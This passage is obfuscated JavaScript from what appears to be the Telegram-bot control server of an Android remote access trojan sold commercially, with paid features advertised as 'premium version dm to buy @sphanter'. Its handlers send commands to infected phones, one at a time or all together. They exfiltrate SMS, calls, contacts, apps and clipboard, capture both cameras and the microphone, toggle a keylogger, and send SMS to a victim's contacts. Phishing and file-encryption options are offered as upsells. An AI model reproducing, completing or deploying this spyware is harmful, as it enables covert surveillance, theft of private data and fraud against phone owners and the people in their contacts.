                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝚂𝙼𝚂 ✯") {
                                if (currentTarget == "all") {
                                  io.to(currentTarget).emit("commend", {
                                    'request': "all-sms",
                                    'extras': []
                                  });
                                } else {
                                  io.sockets.emit("commend", {
                                    'request': "all-sms",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝙲𝚊𝚕𝚕𝚜 ✯") {
                                if (currentTarget == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "calls",
                                    'extras': []
                                  });
                                } else {
                                  io.to(currentTarget).emit("commend", {
                                    'request': "calls",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [[" 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝙰𝚙𝚙𝚜 ✯") {
                                if (currentTarget == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "apps",
                                    'extras': []
                                  });
                                } else {
                                  io.to(currentTarget).emit("commend", {
                                    'request': "apps",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯") {
                                if (currentTarget == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "main-camera",
                                    'extras': []
                                  });
                                } else {
                                  io.to(currentTarget).emit("commend", {
                                    'request': "main-camera",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯") {
                                if (currentTarget == 'all') {
                                  io.sockets.emit("commend", {
                                    'request': "selfie-camera",
                                    'extras': []
                                  });
                                } else {
                                  io.to(currentTarget).emit('commend', {
                                    'request': "selfie-camera",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯") {
                                if (currentTarget == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "clipboard",
                                    'extras': []
                                  });
                                } else {
                                  io.to(currentTarget).emit("commend", {
                                    'request': "clipboard",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯") {
                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯") {
                                if (currentTarget == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "keylogger-on",
                                    'extras': []
                                  });
                                } else {
                                  io.to(currentTarget).emit("commend", {
                                    'request': "keylogger-on",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯") {
                                if (currentTarget == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "keylogger-off",
                                    'extras': []
                                  });
                                } else {
                                  io.to(currentTarget).emit('commend', {
                                    'request': "keylogger-off",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯") {
                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯") {
                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯") {
                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯") {
                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯") {
                                appData.set("currentAction", 'microphoneDuration');
                                bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚒𝚗𝚐 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n", {
                                  'parse_mode': 'HTML',
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝚃𝚘𝚊𝚜𝚝 ✯") {
                                appData.set("currentAction", "toastText");
                                bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯") {
                                appData.set("currentAction", "smsNumber");
                                bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚂𝙼𝚂</b>\n\n", {
                                  'parse_mode': 'HTML',
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯") {
                                appData.set("currentAction", "vibrateDuration");
                                bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯") {
                                appData.set("currentAction", "textToAllContacts");
                                bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚊𝚕𝚕 𝚝𝚊𝚛𝚐𝚎𝚝 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯") {
                                appData.set("currentAction", "notificationText");
                                bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚊𝚜 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯") {
                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯") {
                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (message.text === "✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯") {
                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                            } else {
								//不在操作列表范围内，选择对应的设备
                              io.sockets.sockets.forEach((_0x22a16b, _0x30e015, _0x5acd93) => {
                                if (message.text === _0x22a16b.model) {
                                  appData.set("currentTarget", _0x30e015);
                                  bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + _0x22a16b.model + "</b>\n\n", {
                                    'parse_mode': "HTML",
                                    'reply_markup': {
                                      'keyboard': [["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"], ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"], ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"], ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"], ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"], ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"], ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"], ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"], ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"], ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"], ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"], ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯"], ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]],
                                      'resize_keyboard': true,
                                      'one_time_keyboard': true
                                    }
                                  });
                                }
                              });
							  //选择所有设备
                              if (message.text == "✯ 𝙰𝚕𝚕 ✯") {
                                appData.set("currentTarget", "all");
                                bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
